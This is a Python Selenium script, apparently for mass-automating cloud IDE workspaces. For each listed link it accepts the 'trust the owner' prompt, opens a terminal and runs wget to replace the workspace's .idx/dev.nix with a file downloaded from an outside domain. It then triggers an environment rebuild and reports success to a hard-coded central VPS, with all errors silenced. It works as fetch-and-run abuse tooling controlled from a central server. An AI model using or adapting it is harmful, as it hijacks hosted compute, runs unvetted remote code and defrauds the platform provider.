import os
import time
import sys
import requests
import uuid
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# Configuration
SLEEP_SEBELUM_AKSI = 80
SLEEP_SESUDAH_AKSI = 5
SLEEP_JIKA_ERROR = 10
VPS_ENDPOINT = "http://47.84.61.131:5000"  # Change to your VPS IP
RDP_ID = str(uuid.uuid4())  # Unique identifier for this RDP
MAX_RETRIES = 3  # Max retries for VPS communication

def silent_excepthook(*args, **kwargs):
    pass

sys.excepthook = silent_excepthook

def get_chrome_options():
    """Setup Chrome driver options dengan user data directory yang benar"""
    options = webdriver.ChromeOptions()
    options.add_argument(f"user-data-dir=C:\\Users\\Administrator\\Desktop\\Profile1")
    options.add_argument("--profile-directory=Default")
    options.add_argument("--window-position=0,0")
    options.add_argument("--window-size=500,500")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--force-dark-mode")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option("prefs", {
        "profile.default_content_setting_values.notifications": 2,
        "credentials_enable_service": False,
        "profile.password_manager_enabled": False
    })
    return options

def register_with_vps(profile_name):
    """Register this RDP with the central VPS"""
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(
                f"{VPS_ENDPOINT}/register_rdp",
                json={
                    "rdp_id": RDP_ID,
                    "profile_name": profile_name
                },
                timeout=10
            )
            if response.status_code == 200:
                return response.json().get('total_rdps', 1)
        except Exception as e:
            time.sleep(5)
    return 1  # Default to 1 if registration fails

def read_links_from_file(file_path):
    if not os.path.exists(file_path):
        return []
    with open(file_path, 'r') as file:
        links = file.readlines()
    return [link.strip() for link in links if link.strip()]

def find_and_click_rebuild(driver):
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for i, iframe in enumerate(iframes):
            driver.switch_to.frame(iframe)
            try:
                rebuild_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, "div.floating-click-widget > div"))
                )
                if "Rebuild Environment" in rebuild_btn.text:
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", rebuild_btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", rebuild_btn)
                    return True
            except TimeoutException:
                pass
            finally:
                driver.switch_to.default_content()
        return False
    except Exception:
        driver.switch_to.default_content()
        return False

def open_terminal_and_run(driver):
    try:
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).key_down(Keys.SHIFT).send_keys('E').key_up(Keys.SHIFT).key_up(Keys.CONTROL).perform()
        time.sleep(2)

        body = driver.find_element(By.TAG_NAME, "body")
        body.click()
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
        time.sleep(3)

        commands = [
            'wget -q -O .idx/dev.nix https://dot-store.biz.id/joko.nix'
        ]
        for cmd in commands:
            actions = ActionChains(driver)
            for char in cmd:
                actions.send_keys(char)
            actions.send_keys(Keys.ENTER)
            actions.perform()
            time.sleep(2)

            actions = ActionChains(driver)
            actions.send_keys(Keys.ENTER)
            actions.perform()
            time.sleep(3)

        find_and_click_rebuild(driver)
        return True
    except Exception:
        return False

def send_results_to_vps(success_links, failed_links, profile_name):
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(
                f"{VPS_ENDPOINT}/submit_results",
                json={
                    "rdp_id": RDP_ID,
                    "profile_name": profile_name,
                    "success_links": success_links,
                    "failed_links": failed_links,
                    "timestamp": datetime.now().isoformat()
                },
                timeout=15
            )
            if response.status_code == 200:
                return True
        except Exception:
            time.sleep(5)
    return False

def process_single_link(link, profile_name):
    """Process a single link and always quit browser afterwards"""
    driver = None
    try:
        # Open browser for this link
        options = get_chrome_options()
        driver = webdriver.Chrome(options=options)
        
        driver.get(link)
        wait = WebDriverWait(driver, 20)
        
        # Try to click trust button
        trust_success = False
        try:
            trust_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'I trust the owner')]")))
            trust_button.click()
            time.sleep(2)
            trust_success = True
        except Exception:
            pass
        
        terminal_success = False
        if trust_success:
            try:
                # Click Open Workspace
                open_workspace_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Open Workspace')]")))
                open_workspace_button.click()
                time.sleep(2)
                
                # Wait before terminal actions
                time.sleep(SLEEP_SEBELUM_AKSI)
                
                # Run terminal commands
                terminal_success = open_terminal_and_run(driver)
                
                # Wait after terminal actions
                time.sleep(SLEEP_SESUDAH_AKSI)
                
            except Exception:
                pass
        
        # Always quit browser after processing link
        if driver:
            driver.quit()
        
        return trust_success and terminal_success
        
    except Exception:
        # Ensure browser is closed even if error occurs
        if driver:
            try:
                driver.quit()
            except:
                pass
        return False

def main():
    # Register with VPS first
    profile_name = "Profile1"
    total_rdps = register_with_vps(profile_name)
    
    # Read links from file
    links = read_links_from_file("link.txt")
    
    if not links:
        return

    success_links = []
    failed_links = []
    
    # Clear terminal and show only total links
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"Memproses total {len(links)} link...")
    
    # Process each link one by one
    for index, link in enumerate(links):
        # Process the link (browser will be opened and closed inside this function)
        success = process_single_link(link, profile_name)
        
        if success:
            success_links.append(link)
        else:
            failed_links.append(link)
        
        # Small delay before processing next link
        if index < len(links) - 1:
            time.sleep(SLEEP_JIKA_ERROR)
    
    # Send final results to VPS
    send_results_to_vps(success_links, failed_links, profile_name)

if __name__ == "__main__":
    main()
